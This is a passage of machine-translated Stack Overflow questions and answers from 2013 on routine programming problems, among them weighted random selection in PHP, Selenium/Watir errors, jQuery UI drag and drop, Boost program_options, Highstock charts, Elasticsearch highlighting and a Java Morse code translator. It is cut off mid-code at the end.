从一开始就将单独的类型分开存储，并在需要时提供组合列表的视图。[Guava's`Iterables#concat()`](http://docs.guava-libraries.googlecode.com/git/javadoc/com/google/common/collect/Iterables.html#concat%28java.lang.Iterable,%20java.lang.Iterable%29)对于创建这样的视图很有用。

* * *

边注：

除非`Bar extends Foo`or `Foo extends Bar`，同时调用`getFoos()`and`getBars()`保证抛出一个`ClassCastException`if`bases`包含两个`Foo`and`Bar`实例。

* * *

回应 digitaljoel 和 Louis 的评论：

```
List<Foo> getFoos() {
    return Lists.newArrayList(Iterables.filter(bases, Foo.class));
}

List<Bar> getBars() {
    return Lists.newArrayList(Iterables.filter(bases, Bar.class));
} 
```

# php - 计算给定范围的概率

> ID：15750372
> 
> 赞同：0
> 
> 时间：2013-04-01T19:31:57.123
> 
> 标签：php, arrays, probability

在最后的几个应用程序中，我应该实现概率，通常在某些项目中给出：

奖励某个级别完成项目的用户`X`

项目`X`可能是以下之一：

```
jug => probability 25
glass => probability 50
plate => probability 20
dish => probability 5 
```

我通过创建一个数组并按照其概率的次数填充特定项目来解决这个问题；对于上述情况，我将有一个带有`25 elements of jug, 50 glasses and so on.`. 我最后`shuffle`{PHP} 数组几次并从中选择一个随机元素。

在另一个应用程序中，这些值总计超过 100，因此我首先从该总数中计算出它们的受尊重百分比，然后使用上述逻辑。

只是想知道这是否是从这种结构计算概率的正确方法？

我在 SOF 上遇到了几个问题，但没有一个对我有帮助。

如果有更合适的方法可以做到这一点，请告诉我

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T19:43:37.607

您可以简单地分配以下值：

```
$jug = 25;
$glass = 25+50 = 75;
$plate = 75+20 = 95;
$dish = 95+5 = 100 
```

然后获得一个 100 的随机数并确定它适合的位置，类似于下面的**伪代码**：

```
$jug = 25;
$glass = 75;
$plate = 95;
$dish = 100;
$items = {"jug", "glass", "plate", "dish"};

$rand = random(100);  // Get a random number between 0 and 100

if ($rand < $jug) {
    return items(0);
} elseif ($rand < $glass) {
    return items(1);
} elseif ($rand < $plate) {
    return items(2);
} elseif ($rand < $dish) {
    return items(3);
} 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:37:52.253

我会以与您相同的方式执行此操作，但您不必计算百分比，您可以使用 100 多个元素。

例如，如果 A=80 和 B=40，您可以使用包含 120 个元素的数组。

但是，在数学中有一个术语[最大公约数](http://en.wikipedia.org/wiki/Greatest_common_divisor)可以减少元素的数量。在此示例中，GCD 为 40，因此 A 为 2，B 为 1，您的数组大小将减少到 3 个元素。例如，当元素的总数非常大时，它可能很重要。

# safari - 有没有办法阻止背面可见性：在 safari 的转换过程中隐藏？

> ID：15750373
> 
> 赞同：1
> 
> 时间：2013-04-01T19:31:57.673
> 
> 标签：safari, css-transitions

过渡很棒！当与**功能强大的浏览器**一起使用时，直到最近我还认为该术语包括 Chrome、Firefox 和 Safari ...... Firefox 和 Safari 一直在让人失望！

我正在尝试一组相当复杂的动画，涉及纯粹的过渡和固定背景。在 Chrome 中，一切都是肉汁，我在具有一`background-image`组和一`background-attachment`组固定的父容器中应用过渡和移动元素。

据我观察；在 safari 中，每当发生任何类型的转换时 backface-visibility:hidden 都会附加到页面上的所有元素，或者肯定是一些祖先或目标元素。

`backface-visibility:hidden;`与它一起使用时有一个相当未记录的问题`background-attatchment:fixed;`将删除`background-image`正在修复的表单视图，请参见此处。

因此，当页面上任何地方发生任何涉及不透明度或 3d 转换的转换时，我的图像会闪烁并在 safari 应用`backface-visibility`效果时再次返回。

有谁知道解决这个问题的方法？它相当烦人，而且我怀疑苹果会更新一段时间，我希望有一个解决方案。

# selenium - Watir/Selenium 给出错误“元素当前不可交互”

> ID：15750375
> 
> 赞同：3
> 
> 时间：2013-04-01T19:32:01.107
> 
> 标签：selenium, webdriver, watir

我正在尝试使用 watir 进行测试，这是一个我们正在开发的 Web 应用程序，但遇到了一个令人困惑的错误。

有问题的HTML是

```
<td>
  <div class="filter-container">
    <input name="PersonName" type="text">
  </div>
</td> 
```

窒息的命令是：

```
b.text_field(:name, "PersonName").set "Robert" 
```

irb 返回的错误是：

```
Selenium::WebDriver::Error::InvalidElementStateError: Element is not currently interactable and may not be manipulated
from /usr/local/Cellar/ruby/2.0.0-p0/lib/ruby/gems/2.0.0/gems/selenium-webdriver-2.31.0/lib/selenium/webdriver/remote/response.rb:52:in `assert_ok'
from /usr/local/Cellar/ruby/2.0.0-p0/lib/ruby/gems/2.0.0/gems/selenium-webdriver-2.31.0/lib/selenium/webdriver/remote/response.rb:15:in `initialize' 
```

（还有几行，但我认为上面是相关的东西）

文本框*可以*使用鼠标和键盘“交互”，所以我不知道为什么 watir 会犹豫。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-03T19:35:21.593

页面上输入名称为 PersonName 的文本字段是否可能不止一个？也许隐藏在页面上的某个地方？Selenium 可能针对其他文本字段并报告它已被禁用。尝试使用：

```
b.div(:class, "filter-container").text_field(:name, "PersonName").set "Robert" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-26T18:39:53.733

检查以确保 Selenium 没有在页面上找到第二个具有相同名称的隐藏元素。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T20:01:18.030

当您尝试与禁用的元素交互时会发生这种情况。阅读[此处](http://www.ruby-doc.org/gems/docs/b/bbc-selenium-webdriver-1.17.0/Selenium/WebDriver/Error/InvalidElementStateError.html)了解更多信息。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-11-10T03:19:11.510

我遇到了相同类型的 selenium 错误消息，发现在运行代码之前清除了所有浏览器历史记录（浏览和下载历史记录、表单和搜索历史记录、Cookie、缓存、活动登录、离线网站数据和站点首选项）按预期工作。

这不是一个很好的解决方案，因为我*每次*运行代码时都必须清除所有内容。不优雅但实用。

注意：我通过 splinter 调用 selenium 并使用 firefox 作为我的 splinter 浏览器，以防万一。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-04-15T13:09:25.323

这种情况经常发生在我身上，看起来它试图过早地访问一个元素。具有两个确定/取消按钮的动态模式页面的示例代码：

不起作用：

```
$this->getSession()->getPage()->pressButton('Cancel'); 
```

在我的情况下效果很好：

```
sleep(1);
$this->getSession()->getPage()->pressButton('Cancel'); 
```

遗憾的是，我没有找到任何 Selenium 解决方案来等到元素“可交互”。

# jquery - jQuery UI Drag & Drop 的问题 - 输入后不允许在 textarea 中放置

> ID：15750378
> 
> 赞同：2
> 
> 时间：2013-04-01T19:32:20.790
> 
> 标签：jquery, jquery-ui, jquery-ui-draggable, jquery-ui-droppable

我正在创建一个界面，允许用户将预设响应拖放到“回复”`<textarea>`中。我决定使用 jQuery UI。

**问题：**输入**.droppable()**`<textarea>`后，功能被破坏。

 **我可以单击内部`<textarea>`然后将文本放入其中，但输入后，我无法将任何文本放入`<textarea>`...

**jQuery：**

```
$(document).ready(function(){

    $(init);

    // Initialization
    function init(){
        // Draggable
        $(".response").draggable({
            helper : "clone",
            cursor : "move"
        });

        // Droppable
        $(".survey-reply textarea").droppable({
            accept : ".response",
            drop : dropResponse
        });
    }

    // When Dropped
    function dropResponse(event,ui) {

        var draggable = ui.draggable;

        // Get existing text
        var text = $(this).text();

        // If field is empty then just apply the dragged response
        if (text == "") {
            $(this).text(draggable.children(".saved-response").val()).appendTo(this);
        }
        // If not, then add the dragged response to the present text
        else {
            $(this).text(text + ' ' + draggable.children(".saved-response").val()).appendTo(this);
        }

    }

}); 
```

这完成了我需要的（几乎）。它允许我将`<li>`响应拖到`<textarea>`. 它还编译文本而不是替换`<textarea>`.

**它不能做什么：**我需要用户能够输入`<textarea>`，然后将响应拖到 中`<textarea>`，此时预设响应被添加到输入的文本中。

目前，我可以在 内部单击`<textarea>`，当它处于焦点时，将响应拖入其中。但由于某种原因，***输入`<textarea>`禁用可放置事件......***

***如果有人能帮我弄清楚如何在文本区域中输入，然后将响应拖到同一个文本区域中，我会很感激的！***

**注意：**我没有包含 HTML，但我向您保证，选择器是准确的。我确实有一个**占位符**属性应用于`<textarea>`. 我不相信这与这个问题有任何关系（因为拖放文本会消除显示的占位符文本......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T22:03:33.083

问题是您正在使用该`text()`函数来获取/设置 textarea 值，您真正想要的是`val()`. 另外，我不认为您想要`.appendTo(this)`更新 textarea 值的调用，并且您不需要用 包装对 init 的调用`$()`，您可以这样`init();`做 更改这两行，它应该可以工作：

改变这个：

```
var text = $(this).text(); 
```

到

```
var text = $(this).val(); 
```

并改变这个：

```
$(this).text(text + ' ' + draggable.children(".saved-response").val()).appendTo(this); 
```

对此：

```
$(this).val(text + ' ' + draggable.children(".saved-response").val()); 
```**

# achartengine - achartengine 条形图多系列

> ID：15750380
> 
> 赞同：1
> 
> 时间：2013-04-01T19:32:26.967
> 
> 标签：achartengine

我有一个条形图，我正在使用三个不同的系列。所有数据都正确显示，但该系列使用每个系列的不同宽度的条进行渲染。我不能让不同系列的条具有相同的宽度。

```
SDFSeries = new XYSeries("Seven Day Forecast"); 
FPSeries = new XYSeries("Forecast Peak"); 
APDSeries = new XYSeries("Actual Peak to Date"); 

XYSeriesRenderer sdfRenderer = new XYSeriesRenderer(); 
sdfRenderer.setColor(Color.rgb(90, 152, 253));
sdfRenderer.setDisplayChartValues(true); 
sdfRenderer.setChartValuesTextSize(18);

XYSeriesRenderer fpRenderer = new XYSeriesRenderer(); 
fpRenderer.setColor(Color.rgb(255, 255, 0)); 
fpRenderer.setDisplayChartValues(true);
fpRenderer.setChartValuesTextSize(18);

XYSeriesRenderer apdRenderer = new XYSeriesRenderer(); 
apdRenderer.setColor(Color.rgb(255, 0, 0)); 
apdRenderer.setDisplayChartValues(true);
apdRenderer.setChartValuesTextSize(18);

multiRenderer.setXLabels(0); 
multiRenderer.setChartTitle("7 Day Outlook - Maximum Demand"); 
multiRenderer.setXTitle(""); 
multiRenderer.setYTitle("MegaWatts"); 
multiRenderer.addSeriesRenderer(apdRenderer);         
multiRenderer.addSeriesRenderer(fpRenderer);
multiRenderer.addSeriesRenderer(sdfRenderer);
multiRenderer.setMargins(new int[] { 10, 65, 10, 15 });  
multiRenderer.setAxisTitleTextSize(16);
multiRenderer.setChartTitleTextSize(30);
multiRenderer.setLabelsTextSize(15);
multiRenderer.setLegendTextSize(20);
multiRenderer.setLegendHeight(40);
multiRenderer.setBarSpacing(.5);
multiRenderer.setXLabelsAlign(Align.CENTER);
multiRenderer.setYLabelsAlign(Align.RIGHT); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T17:54:51.710

该问题是由具有单个项目的系列以不同方式显示条形宽度引起的。你有一些选择：

*   每个系列至少添加 2 个项目。
*   用于`renderer.setBarWidth()`单品系列。

# c++ - 使用 boost.program_options 处理“-”

> ID：15750390
> 
> 赞同：6
> 
> 时间：2013-04-01T19:33:16.557
> 
> 标签：c++, boost, cat, boost-program-options

在你说 OVERKILL 之前，我不在乎。

如何让 Boost.program_options 处理所需的`cat`选项`-`？

我有

```
// visible
po::options_description options("Options");
options.add_options()("-u", po::value<bool>(), "Write bytes from the input file to the standard output without delay as each is read.");

po::positional_options_description file_options;
file_options.add("file", -1);

po::variables_map vm;
po::store(po::command_line_parser(argc, argv).options(options).positional(file_options).run(), vm);
po::notify(vm);

bool immediate = false;
if(vm.count("-u"))
  immediate = true;
if(vm.count("file"))
  support::print(vm["file"].as<vector<string>>()); 
```

当我运行时抛出异常`cat - - -`：

> 无法识别的选项'-'

我希望它被`-`视为一个位置参数，并且我需要它在完整文件列表中的正确顺序。我怎么能做到这一点？

**更新**

我有一半的修复。我需要

```
po::options_description options("Options");
options.add_options()("-u", po::value<bool>(), "Write bytes from the input file to the standard output without delay as each is read.")
                    ("file", po::value< vector<string> >(), "input file");

po::positional_options_description file_options;
file_options.add("file", -1); 
```

`-`问题是，当我输出参数时，我似乎只得到三个中的两个：

```
if(vm.count("file"))
  support::print(vm["file"].as<vector<string>>()); 
```

其中 support::print 很好地处理了向量和东西。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T19:47:50.980

您需要定义位置的命名程序选项，在您的情况下它是`file`

```
#include <boost/foreach.hpp>
#include <boost/program_options.hpp>

#include <iostream>
#include <string>
#include <vector>

namespace po = boost::program_options;

int
main( int argc, char* argv[] )
{
    std::vector<std::string> input;
    po::options_description options("Options");
    options.add_options()
        ("-u", po::value<bool>(), "Write bytes from the input file to the standard output without delay as each is read.")
        ("file", po::value(&input), "input")
        ;

    po::positional_options_description file_options;
    file_options.add("file", -1);

    po::variables_map vm;
    po::store(po::command_line_parser(argc, argv).options(options).positional(file_options).run(), vm);
    po::notify(vm);

    bool immediate = false;
    if(vm.count("-u"))
        immediate = true;
    BOOST_FOREACH( const auto& i, input ) {
        std::cout << "file: " << i << std::endl;
    }
} 
```

这是一个[coliru 演示](http://coliru.stacked-crooked.com/view?id=2adc03f6a415730af30f31d2d77d56ab-1b2e912b8f4a28f296b926d355b0e4c3)和输出，如果你不想点击的话

```
$ g++ -std=c++11 -O2 -pthread main.cpp -lboost_program_options && ./a.out - - -
file: -
file: -
file: - 
```

* * *

如果您只看到 3 个位置参数中的 2 个，这可能`argv[0]`是因为按照惯例是程序名称，因此不考虑进行参数解析。这可以在`basic_command_line_parser`模板的源代码中看到

```
 37     template<class charT>
 38     basic_command_line_parser<charT>::
 39     basic_command_line_parser(int argc, const charT* const argv[])
 40     : detail::cmdline(
 41         // Explicit template arguments are required by gcc 3.3.1 
 42         // (at least mingw version), and do no harm on other compilers.
 43         to_internal(detail::make_vector<charT, const charT* const*>(argv+1, argv+argc+!argc)))
 44     {} 
```

# android - 从匿名类返回值

> ID：15750392
> 
> 赞同：1
> 
> 时间：2013-04-01T19:33:28.380
> 
> 标签：android, asynchronous, return, anonymous

我有这样的代码：

```
public Dictionary<Object, Object> call(String method, Iterable args)
{
    AsyncHttpClient client = new AsyncHttpClient();
client.get(getUrl(method, args), new AsyncHttpResponseHandler() {
    @Override
    public void onSuccess(String response) 
            {
        Gson gson = new GsonBuilder().create();             
    }       
    });
} 
```

我希望能够返回`(Dictionary<Object, Object>) gson.fromJson(response, Dictionary.class)`到我的`call`方法，但是如何做？我使用[http://loopj.com/android-async-http/](http://loopj.com/android-async-http/)来拥有一个易于使用的异步 HTTP 请求系统。

谢谢 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:45:08.527

由于完成时尚未创建 gson 对象`call()`，因此不会返回任何内容。

有一些解决方法，具体取决于您的具体需求。通常，您需要调用`gson.fromJson(response, Dictionary.class)`，`onSuccess()`将结果放在已知位置，然后向您的应用发送一条消息，表明数据已准备就绪。

此外，由于无法保证成功，因此您需要处理 http 请求失败的情况。

# android - 如何更改 linerLayout 或 RelativeLayout 中文本视图和按钮的顺序？

> ID：15750393
> 
> 赞同：1
> 
> 时间：2013-04-01T19:33:32.980
> 
> 标签：android, eclipse

我对stackoverflow完全陌生，并且只有几周的android移动开发。

非常感谢 stackoverflow，我 90% 的谷歌搜索都以“Android eclipse”开头。

现在开始追逐。

我有一个带有按钮和两个 textView 元素的线性布局。

是否可以动态：

1.  改变他们的顺序？
2.  将其中一些移动到另一个 linearLayout 或 relativeLayout？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:37:23.660

动态是指在Java代码中吗？

如果是，那么这些视图也应该动态添加。然后要更改它们的顺序，您可以将它们从布局中删除，然后按照您想要的顺序再次添加它们。如果您的意思是在您的 XML 文件中，那么您需要做的就是更改它们在 XML 文件中的顺序。

要将视图添加到布局中，您应该：

**1.**通过id查找布局：

```
LinearLayout llviews = (LinearLayout) findViewById(R.id.your_linear_layout_id); 
```

**2.**然后，您可以向此布局添加视图：

```
TextView tvText = new TextView();
llviews.addView(tvText); 
```

**3.**删除视图：

```
llviews.removeView(tvText); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-01T20:03:46.940

1.  是的，即使`Views`是在 XML 中添加的，也可以动态更改视图的顺序。
2.  是的，可以将子视图从一种布局移动到另一种布局。

查看此示例代码：

```
public class MainActivity extends Activity {
    private Button button1, button2, button3;
    private CheckBox checkBox1;
    private LinearLayout ll1, ll2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ll1 = (LinearLayout) findViewById(R.id.ll1);
        ll2 = (LinearLayout) findViewById(R.id.ll2);

        button1 = (Button) findViewById(R.id.button1);
        button1.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View arg0) {
                // Move views around.
                float button2x = button2.getX();
                float button2y = button2.getY();

                float checkbox1x = checkBox1.getX();
                float checkbox1y = checkBox1.getY();

                button2.setX(checkbox1x);
                button2.setY(checkbox1y);

                checkBox1.setX(button2x);
                checkBox1.setY(button2y);
            }
        });

        button3 = (Button) findViewById(R.id.button3);
        button3.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                // Move a view from one layout to another.
                ll1.removeView(button2);
                ll2.addView(button2);
            }
        });

        button2 = (Button) findViewById(R.id.button2);

        checkBox1 = (CheckBox) findViewById(R.id.checkBox1);
    }
} 
```

=== activity_main.xml ===

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" android:id="@+id/ll1">

    <Button
        android:id="@+id/button1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginLeft="42dp"
        android:layout_marginTop="22dp"
        android:text="Button" />

    <Button
        android:id="@+id/button2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Button2" />

    <CheckBox
        android:id="@+id/checkBox1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="99dp"
        android:text="CheckBox" />

    <LinearLayout android:id="@+id/ll2"
        android:layout_width="match_parent"
        android:layout_height="wrap_content" >

        <Button
            android:id="@+id/button3"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Button3" />

    </LinearLayout>

</LinearLayout> 
```

# php - Highstock 不显示图表

> ID：15750394
> 
> 赞同：1
> 
> 时间：2013-04-01T19:33:33.817
> 
> 标签：php, mysql, json, highstock

我有 php 文件，它以 JSON 格式生成数据**get_json.php**和我想要显示图表**grafik.php**的文件。

**get_json.php**中的代码

 **```
<?php
include('config.php');   //connection to DB

$r=("SELECT * FROM data");
$result=mysql_query($r);

while($row = mysql_fetch_array($result)){

$date= strtotime($row['cas'])*1000;   //time in format 2013-03-21 16:23:11 
$values=hexdec($row['data']);         // hex values to decimal
$array[]=array($date, $values);
}

echo json_encode($array);

?> 
```

JSON **GET_JSON.PHP**的输出 [[1364463576000,46906]，[1364463578000,50379]，[1364463580000,33733] 1364665254000,14964],[1364665256000,11443],[1364665257000,9005],[1364665259000,5283],[1364665260000,1731]]

**grafik.php**中的代码

 **```
<html>
 <head>
  <script src="http://code.highcharts.com/stock/highstock.js"></script>
  <script src="http://code.highcharts.com/stock/modules/exporting.js"></script>
 </head>
 <body>

   <script>
     $(function() {
  $.getJSON('http://localhost/testing10/get_json.php', function(data) {

    $('#container').highcharts('StockChart', {

        rangeSelector : {
            selected : 1
        },

        title : {
            text : 'AAPL Stock Price'
        },

        series : [{
            name : 'AAPL Stock Price',
            data : data,
            marker : {
                enabled : true,
                radius : 3
            },
            shadow : true,
            tooltip : {
                valueDecimals : 2
            }
        }]
    });
});
});

</script>
 <div id="container" style="height: 500px; min-width: 500px"></div>
</body>
</html> 
```

我不知道我在哪里做错了，如果有人看到一些错误，请帮助我解决这个问题。我正在尝试绘制 X 轴上的时间和 Y 轴上的正确值的图表。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T07:50:34.593

我让你的数据正常工作：

```
$('#container').highcharts({
 rangeSelector: {
     selected: 1
 },

 title: {
     text: 'AAPL Stock Price'
 },
 series: [{
     name: 'AAPL Stock Price',
     data: [
         [1364463576000, 46906],
         [1364463578000, 50379],
         [1364463580000, 33733],
         [1364463582000, 5612],
         [1364463981000, 14213],
         [1364464007000, 11208],
         [1364490137000, 38047],
         [1364665254000, 14964],
         [1364665256000, 11443],
         [1364665257000, 9005],
         [1364665259000, 5283],
         [1364665260000, 1731]
     ],
     marker: {
         enabled: true,
         radius: 3
     },
     shadow: true,
     tooltip: {
         valueDecimals: 2
     }
 }]
}); 
```

[http://jsfiddle.net/3A3bK/](http://jsfiddle.net/3A3bK/)

我不得不改变拳头线：

```
$('#container').highcharts('StockChart', { 
```

至

```
$('#container').highcharts({ 
```****

# timestamp - 使用 DOS 提示符在两台计算机之间进行时间同步

> ID：15750397
> 
> 赞同：1
> 
> 时间：2013-04-01T19:33:40.347
> 
> 标签：timestamp

我有一个问题，我被难住了。我需要在不使用 NTP 的情况下在两台计算机之间同步时钟（这是我的第一个解决方案，但我的老板说它们可能不会 100% 连接到网络）。t 不必是正确的时间，只要两台计算机的时间相同即可。我更喜欢在 DOS 提示符下执行此操作，因为我不确定另一台计算机可能正在运行什么操作系统。有人告诉我，实用程序**w32m**可以提供所需的同步，但没有找到关于该实用程序的太多信息。任何帮助，将不胜感激。这是我在这里的第一个问题，但我过去经常使用您的答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:09:17.520

如果您不确定对方正在运行什么操作系统，那么您绝对应该使用 NTP！它确实是唯一的跨平台时间同步协议，而且是最好的。

NTP 将处理计算机在 100% 的时间内无法相互通信的情况。我认为 Internet 访问可能更加不可靠，但这没关系，因为如有必要，其中一台计算机可以配置为第 1 层源（或连接到第 1 层源，例如 GPS）。

# java - Java 构造函数调用被忽略/没有抛出错误

> ID：15750398
> 
> 赞同：2
> 
> 时间：2013-04-01T19:33:54.057
> 
> 标签：java, constructor, try-catch

如果这在其他地方已经涵盖，我提前道歉，但所涉及的模糊/常用术语意味着我发现了很多不相关的点击，没有任何帮助。由于我的项目相当大，我认为提供 M(N)WE 对我来说是不合理的，所以我正在寻找关于还有什么要检查的想法。这是代码块：

```
try {
    myClassObject = new MyClass(string1, string2, string3, otherClassObject); (1)
    System.out.println("Test"); (2)
} catch (Exception e){ 
    System.out.println(e.getMessage() + " " + e.getStackTrace()); (3)
} 
```

我的构造函数（1）永远不会被调用。然而，(2) 和 (3) 都没有被调用（即测试字符串永远不会被打印，也不会打印异常）。根据我对 try-catch 块的理解，这应该是不可能的。

我使用 Eclipse 的调试模式并且能够跨过那条线。所有 4 个对象都已定义并且可以很好地打印（所以这不是访问问题）。在调试模式下查看时，所有 4 个对象都有其预期值。但是，调试模式从 (1) 跳到我的代码的其余部分，从不点击 (2) 或 (3)。永远不会到达放置在 MyClass 的构造函数中的调试点。

我可以调用 MyClass 的默认构造函数来代替 4 参数构造函数，它的行为符合需要。然后，我可以在 (2) 之后复制/粘贴 4 参数构造函数的内容，并正确设置所有 4 个参数，并根据需要创建对象。显然这是一个可行的解决方法，但我找不到 4 参数构造函数失败的原因。

简而言之，我不知道这怎么可能，更不用说如何阻止它发生了。

编辑：我已经多次对代码执行了 clean -> build -> debug，所以我相当有信心这不是 .class 问题。以防万一我删除了 .bin 并刷新，但没有效果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:46:52.540

是否存在未实现 Throwable 并因此无法捕获的错误？你在构造函数中做什么？例如 ChuckNorris 异常 :)[无法捕获的 ChuckNorrisException](https://stackoverflow.com/questions/13883166/uncatchable-chucknorrisexception)

# python - 使用循环创建 python 字典而不单独定义数据

> ID：15750399
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:33:59.450
> 
> 标签：python, dictionary

我正在尝试以这种方式创建字典：

有两组数据：之前和之后，每组都是100个元素的数组（0到99）

还有一个值与之前和之后的每个组合相关联，它是一个大小为 10000X1 的向量。

我想创建一个字典，以便我可以使用字典键引用向量中的值。

例如（对于 3 个元素而不是 100 个）

之前 = ['0','1','2']，之后 = ['0','1','2']，向量 = [1 2 3 4 5 6 7 8 9]，

字典输出应该是：

(0,0): 1, (0,1): 2, (0,2): 3, (1,0): 4, (1,1): 5, (1,2): 6, (2 ,0): 7, (2,1): 8, (2,2):9

我知道如何通过单独定义键然后使用 dict(zip()) 函数来为这么几个元素执行此操作，但是对于如此大的集合，是否有更好的方法来执行此操作。我正在考虑使用循环，但似乎无法让它产生 (0,0)、(0,1)、(0,2) .... 等作为键。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:40:42.110

`itertools.product(range(100), range(100))`将为您提供一个生成所需所有键的迭代器，您可以`itertools.izip`使用目标向量生成字典。

# elasticsearch - elasticsearch高亮错误，未能高亮...字符串索引超出范围

> ID：15750402
> 
> 赞同：0
> 
> 时间：2013-04-01T19:34:31.323
> 
> 标签：elasticsearch, tire

我无法确定这个错误的头或尾，而且它非常随机地发生在我什至不知道从哪里开始寻找的地方。

这就是完整错误的样子

轮胎::搜索::SearchRequestFailed: 500 :

```
{
  "error": "SearchPhaseExecutionException[Failed to execute phase [query_fetch], total failure; 
            shardFailures {[7McitJnjQkqLkViqUpZUyw][content][4]: 
              FetchPhaseExecutionException[[content][4]: 
                query[+_all:account +_all:set +_all:up],from[0],size[20]: 
                Fetch Failed [Failed to highlight field [post_content]]]; 
                nested: StringIndexOutOfBoundsException[String index out of range: -5]; }]",
  "status": 500
} 
```

像“关系学习”这样的查询

运行良好，但运行“以关系为中心的学习”

会抛出错误，实际上任何与“关系学习”一起使用的字母 c、d、j、q、x、z .. 像“d 关系学习”都会抛出错误。

真是令人抓狂。

我正在使用轮胎运行 elasticsearch 19.2 我只想知道从哪里开始寻找，任何想法都会有所帮助。

这是对我遇到的问题[的更完整的解释，完全一样](https://gist.github.com/lukas-vlcek/5005428)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T22:06:20.753

正如@imotov 上面所说，这是 lucene 中的一个错误，因此是 elasticsearch，[https: //issues.apache.org/jira/browse/LUCENE-4899](https://issues.apache.org/jira/browse/LUCENE-4899)

您可以通过不使用快速矢量荧光笔来解决它，或者通过将 fragment_size 设置为更高的数字来减少出现错误的发生率。

我怀疑它们会完全消失，除非你将 fragment_size 设置为一个不可能的高数字，你可以这样做（理论上，但你必须自己处理截断，这违背了荧光笔在第一名）

# php - 正则表达式令人困惑

> ID：15750404
> 
> 赞同：1
> 
> 时间：2013-04-01T19:34:33.167
> 
> 标签：php, regex

如果我有这样`"location":"Denton TX"`的字符串（包括双引号），我只想得到`Denton TX`. 我怎样才能为那个东西写正则表达式？

我试过了

```
function getInfo($info,$content){
    echo 'getting INFO';
    preg_match_all("\.".$info."\.:\"[^\"]*(.*?)\.,",$content,$matches,PREG_PATTERN_ORDER);
    print_r($matches);
    return $matches[0];
} 
```

我把“位置”放进去`$info`，但它不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:47:21.703

I'd go with this:

```
"\"".$info."\":\"([^\"]+)\"" 
```

I'm not sure why you wrote this particular bit, but the main problem in your regex is the `[^\"]*`, which is too greedy and will consume everything, and leave `(.*?)` empty (well, unless is starts with a double quote, I guess). I also don't really understand why you what a comma in the end, but maybe your example wasn't descrptive... In any case, the regex I provided should match your example, provided `$info` contains the string `location`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:39:03.240

简单地获取引号之间的每个字符。你离得太近了。

```
"\.".$info."\.:\"([^\"]*)\" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T20:03:33.577

试试这个： (?<=:")(.*)(?=")

我使用类似的方法从 Android 应用程序中的 XML 响应中删除元素标签。祝你好运

# java - 莫尔斯电码，从英语到莫尔斯电码

> ID：15750405
> 
> 赞同：0
> 
> 时间：2013-04-01T19:34:36.273
> 
> 标签：java

我创建了一个程序，它将输入转换为摩尔斯电码并将其显示为输出。这是我的程序。

我翻译消息的班级。

```
import java.io.File;
import java.io.IOException;
import java.util.Scanner;

public class MorseCode {
 public MorseCode()
    {
    }//end default constructor
    public String[] translateHere(String s)throws IOException
    {
        String compare = s, codedLine = "";  //userInput toUpperCase
        int length = compare.length();  //length of userInput
        String line, file = "morsecode.txt";// variable holding file name and variable for each letter/number
        char code;
        //Constants
        final int MAX = 36;
        //Arrays
        char[] morseLetter = new char[MAX];
        String[] morseCode = new String[MAX];
        String[] newMessage = new String[length];
        //putting user input in a character array;
        char[] userLetters = compare.toCharArray();
        //object creation
        File openFile = new File(file);
        Scanner inFile = new Scanner(openFile);
        int  counter = 0;
        while(inFile.hasNext())
            {
                line = inFile.next();
                code = (char)line.charAt(0);
                //System.out.println(code);
                morseLetter[counter] = code;
                morseCode[counter] = inFile.next();
                counter++;
            }//end nested while loop
        for(int j = 0; j < length; j++)
        {
            for(int k = 0; k < MAX; k++)
            {
                if(userLetters[j] == morseLetter[k])
                {
                    newMessage[j] = morseCode[k];
                }
            }//end nested for loop
        }//end for loop
        return newMessage;
    }//end method that completes translateion
    public String toString(String a, String[] b)
{
   System.out.println("Input: " + a);
   System.out.println("Output:");
   String output = "";
   for(int i = 0; i < b.length; i++)
   {
      output = output + b[i];
   }
   return output;
 }//end toString method
}//end Translate Class 
```

然后这就是我测试它的地方。

```
package morse.code;
import javax.swing.JOptionPane;
import java.io.*;
public class MorseCodeTester
{
    public static void main(String[] args)throws IOException
    {
        String userInput;
        final String SENTINEL = "0";//for exiting program when entered
        //object creation
        MorseCode text = new MorseCode();
        //getting user input to be translated
        do
        {
            userInput = JOptionPane.showInputDialog("Please enter what you wish to translte to Morse code (no punctuation).");
            String compare = userInput.toUpperCase();
            String[] codedText = new String[compare.length()];
            codedText = text.translateHere(compare);
            text.toString(userInput, codedText);
